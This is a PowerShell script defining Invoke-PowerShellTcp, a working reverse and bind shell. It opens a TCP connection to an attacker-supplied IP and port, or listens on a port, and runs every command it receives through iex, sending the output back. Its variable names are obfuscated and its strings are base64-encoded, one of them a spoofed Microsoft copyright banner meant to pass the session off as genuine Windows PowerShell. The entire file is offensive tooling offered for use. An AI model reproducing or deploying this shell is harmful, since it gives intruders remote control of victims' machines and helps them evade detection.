function Invoke-PowerShellTcp 
{ 
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(
        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $IPAddress,
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $Port,
        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse,
        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind
    )
    try 
    {
        if ($Reverse)
        {
            ${/=\/\/\/==\_/\___} = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
        }
        if ($Bind)
        {
            ${/==\_/===\_/\_/\/} = [System.Net.Sockets.TcpListener]$Port
            ${/==\_/===\_/\_/\/}.start()    
            ${/=\/\/\/==\_/\___} = ${/==\_/===\_/\_/\/}.AcceptTcpClient()
        } 
        ${/=\/=\/==\/====\_} = ${/=\/\/\/==\_/\___}.GetStream()
        [byte[]]${_/=\__/=\/\/\_/=\} = 0..65535|%{0}
        ${______/\____/\/==} = ([text.encoding]::ASCII).GetBytes($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIAByAHUAbgBuAGkAbgBnACAAYQBzACAAdQBzAGUAcgAgAA=='))) + $env:username + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABvAG4AIAA='))) + $env:computername + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CgBDAG8AcAB5AHIAaQBnAGgAdAAgACgAQwApACAAMgAwADEANQAgAE0AaQBjAHIAbwBzAG8AZgB0ACAAQwBvAHIAcABvAHIAYQB0AGkAbwBuAC4AIABBAGwAbAAgAHIAaQBnAGgAdABzACAAcgBlAHMAZQByAHYAZQBkAC4ACgAKAA=='))))
        ${/=\/=\/==\/====\_}.Write(${______/\____/\/==},0,${______/\____/\/==}.Length)
        ${______/\____/\/==} = ([text.encoding]::ASCII).GetBytes($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTACAA'))) + (gl).Path + '>')
        ${/=\/=\/==\/====\_}.Write(${______/\____/\/==},0,${______/\____/\/==}.Length)
        while((${_/\/==\_/\_/\__/=} = ${/=\/=\/==\/====\_}.Read(${_/=\__/=\/\/\_/=\}, 0, ${_/=\__/=\/\/\_/=\}.Length)) -ne 0)
        {
            ${____/\/\/\/====\_} = New-Object -TypeName System.Text.ASCIIEncoding
            ${_/\___/\__/\/\/=\} = ${____/\/\/\/====\_}.GetString(${_/=\__/=\/\/\_/=\},0, ${_/\/==\_/\_/\__/=})
            try
            {
                ${__/\_/===\_/\/\__} = (iex -Command ${_/\___/\__/\/\/=\} 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAG0AZQB0AGgAaQBuAGcAIAB3AGUAbgB0ACAAdwByAG8AbgBnACAAdwBpAHQAaAAgAGUAeABlAGMAdQB0AGkAbwBuACAAbwBmACAAYwBvAG0AbQBhAG4AZAAgAG8AbgAgAHQAaABlACAAdABhAHIAZwBlAHQALgA='))) 
                Write-Error $_
            }
            ${_/==\/=\/=\/\_/=\}  = ${__/\_/===\_/\/\__} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTACAA'))) + (gl).Path + '> '
            ${/==\/\/=\/\__/\_/} = ($error[0] | Out-String)
            $error.clear()
            ${_/==\/=\/=\/\_/=\} = ${_/==\/=\/=\/\_/=\} + ${/==\/\/=\/\__/\_/}
            ${__/\__/\__/=\__/\} = ([text.encoding]::ASCII).GetBytes(${_/==\/=\/=\/\_/=\})
            ${/=\/=\/==\/====\_}.Write(${__/\__/\__/=\__/\},0,${__/\__/\__/=\__/\}.Length)
            ${/=\/=\/==\/====\_}.Flush()  
        }
        ${/=\/\/\/==\_/\___}.Close()
        if (${/==\_/===\_/\_/\/})
        {
            ${/==\_/===\_/\_/\/}.Stop()
        }
    }
    catch
    {
        Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAG0AZQB0AGgAaQBuAGcAIAB3AGUAbgB0ACAAdwByAG8AbgBnACEAIABDAGgAZQBjAGsAIABpAGYAIAB0AGgAZQAgAHMAZQByAHYAZQByACAAaQBzACAAcgBlAGEAYwBoAGEAYgBsAGUAIABhAG4AZAAgAHkAbwB1ACAAYQByAGUAIAB1AHMAaQBuAGcAIAB0AGgAZQAgAGMAbwByAHIAZQBjAHQAIABwAG8AcgB0AC4A'))) 
        Write-Error $_
    }
}
